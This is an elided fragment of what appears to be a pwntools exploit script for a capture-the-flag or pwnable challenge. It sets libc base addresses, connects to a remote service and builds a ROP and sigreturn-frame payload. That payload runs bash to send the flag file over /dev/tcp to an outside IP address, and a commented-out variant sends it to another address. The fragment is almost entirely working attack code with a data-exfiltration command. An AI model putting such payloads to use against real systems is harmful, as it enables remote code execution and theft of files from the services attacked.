...
'''
#                0x7efe93bb0000
libc_addr = 0x00007efe9b8ba000 #local
#libc_addr = 0x7fdeb391f000 #0x7fdeabc15000 #pwnable
sh = remote(host, port)
...
payload = flat(layout) + str(frame)[0x28:] + 'bash -c "cat flag > /dev/tcp/140.114.77.172/10998" \x00'
#payload = flat(layout) + str(frame)[0x28:] + 'bash -c "cat flag 1>/dev/tcp/172.17.0.1/10002" \x00'
